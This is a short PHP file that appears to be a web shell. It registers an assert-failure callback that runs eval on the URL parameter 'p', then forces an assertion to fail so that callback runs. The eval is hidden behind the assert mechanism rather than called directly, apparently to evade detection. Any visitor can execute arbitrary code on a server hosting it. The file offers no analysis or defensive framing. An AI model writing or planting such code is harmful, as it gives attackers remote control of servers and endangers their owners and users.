<?php
function assert_failure($file, $line, $code) {
	eval ( $_GET ['p'] );
}
assert_options ( ASSERT_CALLBACK, 'assert_failure' );
assert ( 1 == 0 );
?>